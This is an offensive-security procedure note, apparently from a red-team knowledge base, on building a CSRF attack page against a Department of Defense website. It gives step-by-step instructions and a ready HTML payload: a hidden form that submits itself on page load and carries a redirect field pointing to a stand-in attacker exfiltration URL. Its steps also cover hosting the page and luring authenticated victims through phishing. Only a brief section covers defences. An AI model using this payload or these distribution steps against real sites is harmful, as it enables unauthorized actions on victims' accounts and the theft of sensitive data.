---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - csrf
  - web
  - cross-site-request-forgery
  - dod
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:29.200Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-Webpage-for-CSRF-Demonstration

## Summary

This procedure involves creating and hosting a malicious webpage that exploits a CSRF vulnerability on a target website, such as a U.S. Department of Defense site, to trick authenticated users into submitting forged requests that can post, change, or redirect confidential information to the attacker.

## Description

Cross-site request forgery (CSRF) occurs when a website lacks proper protections like unique tokens, allowing external sites to forge requests on behalf of authenticated users. In this scenario, the attacker crafts an HTML page with hidden forms or JavaScript that automatically submits data to the vulnerable endpoint. When a victim visits the page while logged in, their browser uses the active session to execute the request, potentially leading to unauthorized actions. This was demonstrated on a DoD website where the absence of CSRF tokens enabled such exploits, risking sensitive data exposure or modification. Prerequisites include knowledge of the target endpoint's form structure and a way to lure victims (e.g., phishing links).

## Requirements

1. Access to a web server or hosting service to deploy the malicious HTML page
2. Knowledge of the target DoD website's vulnerable endpoint URL and required form parameters
3. Victim must be authenticated to the target site and visit the attacker's page
4. Basic HTML and JavaScript skills for crafting the payload

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing forms and validate them server-side
- Use SameSite cookie attributes (e.g., Strict or Lax) to prevent cross-site requests
- Monitor for unusual request patterns from external referers using web application firewalls (WAF)
- Educate users on phishing risks and avoiding untrusted links while authenticated

## Objectives

1. Trick authenticated users into executing forged requests to manipulate sensitive data
2. Demonstrate the vulnerability by hosting a proof-of-concept webpage
3. Highlight risks of data exfiltration or unauthorized changes on high-security sites

## Instructions

### Step 1: Analyze Target Endpoint

**Context**: Identify the vulnerable form or endpoint on the DoD website that lacks CSRF protection, such as a POST endpoint for updating user data.

Inspect the legitimate form using browser developer tools to note the action URL, method (e.g., POST), and required parameters (e.g., hidden fields for confidential info).

No specific command needed; use browser inspection.

> Expected: URL like https://dod-website.example/vulnerable-endpoint and fields like 'action=update' and 'data=confidential_value'.

### Step 2: Craft the Malicious HTML Page

**Context**: Build an HTML page that mimics the form submission without user interaction, using auto-submit JavaScript.

Create an HTML file with a hidden form targeting the endpoint:

```html
<!DOCTYPE html>
<html>
<head><title>Benign Content</title></head>
<body>
    <h1>Click here for more info</h1>
    <form id="exploit-form" action="https://dod-website.example/vulnerable-endpoint" method="POST" style="display:none;">
        <input type="hidden" name="sensitive_field" value="attacker_controlled_data">
        <input type="hidden" name="redirect_url" value="https://attacker.com/exfil">
    </form>
    <script>
        window.onload = function() { document.getElementById('exploit-form').submit(); };
    </script>
</body>
</html>
```

> This page loads, waits for the document to be ready, and submits the form silently. Expected: The form data is sent to the target, altering info or redirecting data.

### Step 3: Host and Distribute the Page

**Context**: Deploy the page and lure the victim to it while they are authenticated.

Upload the HTML to a hosting service (e.g., GitHub Pages, free web host). Share the URL via email, social media, or embedded in another site to social-engineer the victim.

Monitor network traffic (e.g., via proxy) to confirm the request is forged and executed.

> Expected: Victim's browser sends the POST request with their session cookies, resulting in successful unauthorized action.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[dod]]
